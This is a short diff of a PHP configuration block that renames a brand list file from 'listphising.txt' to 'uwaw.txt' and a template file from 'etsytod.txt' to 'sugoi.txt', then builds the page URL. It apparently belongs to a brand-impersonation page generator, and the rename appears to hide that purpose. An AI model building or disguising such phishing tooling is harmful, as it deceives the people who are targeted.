@@ -1,7 +1,7 @@
 <?php
 // Konfigurasi
-$brand_list_file = 'listphising.txt';
-$template_file = 'etsytod.txt';
+$brand_list_file = 'uwaw.txt';
+$template_file = 'sugoi.txt';
 $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
 $current_url = $base_url . $_SERVER['REQUEST_URI'];
 
